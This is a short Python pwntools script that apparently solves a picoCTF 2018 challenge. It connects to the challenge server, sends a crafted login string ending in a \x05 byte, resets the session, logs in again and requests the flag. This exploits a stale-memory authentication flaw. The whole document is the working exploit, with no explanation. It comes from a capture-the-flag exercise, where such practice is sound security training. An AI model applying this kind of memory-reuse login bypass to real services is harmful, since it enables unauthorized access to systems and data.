#!/usr/bin/env python

from pwn import *

# r = process("./auth")
r = remote("2018shell.picoctf.com", 29508)
r.recvuntil("> ")
r.sendline("login AAAA AAA\x05")

r.recvuntil("> ")
r.sendline("reset")

r.recvuntil("> ")
r.sendline("login B")

r.recvuntil("> ")
r.sendline("get-flag")

print(r.recvuntil("> "))

